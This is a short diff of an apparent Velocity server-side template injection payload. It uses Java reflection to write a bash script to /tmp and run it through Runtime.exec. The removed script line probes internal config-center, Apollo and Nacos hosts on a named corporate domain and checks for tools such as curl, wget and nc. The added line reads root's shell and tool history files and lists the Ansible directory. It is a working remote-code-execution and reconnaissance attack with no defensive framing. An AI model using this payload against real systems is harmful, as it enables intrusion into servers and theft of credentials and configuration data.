@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===DNS===; getent hosts config-center.b8.dr.dianrong.io config-center-prod.b8.dr.dianrong.io config-center-uat.b8.dr.dianrong.io config-center-demo.b8.dr.dianrong.io apollo.b8.dr.dianrong.io nacos.b8.dr.dianrong.io 2>&1 | sort -u | head -10; echo ===PY===; python -c 'import sys;print(sys.version)' 2>&1|head -1; echo ===MODS===; python -c 'import pymysql;print(pymysql.__version__)' 2>&1|tail -1; python -c 'import MySQLdb;print(1)' 2>&1|tail -1; echo ===TOOLS===; which xxd gzip file od java javac curl wget nc 2>&1")
+$w2.write("echo ===LESSHST===; cat /root/.lesshst 2>&1 | head -30; echo ===NMCLI===; cat /root/.nmcli-history 2>&1 | head -10; echo ===INSTALL4J===; cat /root/.install4j 2>&1; echo ===ANSIBLE_LS===; ls -laR /root/.ansible 2>&1 | head -20")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
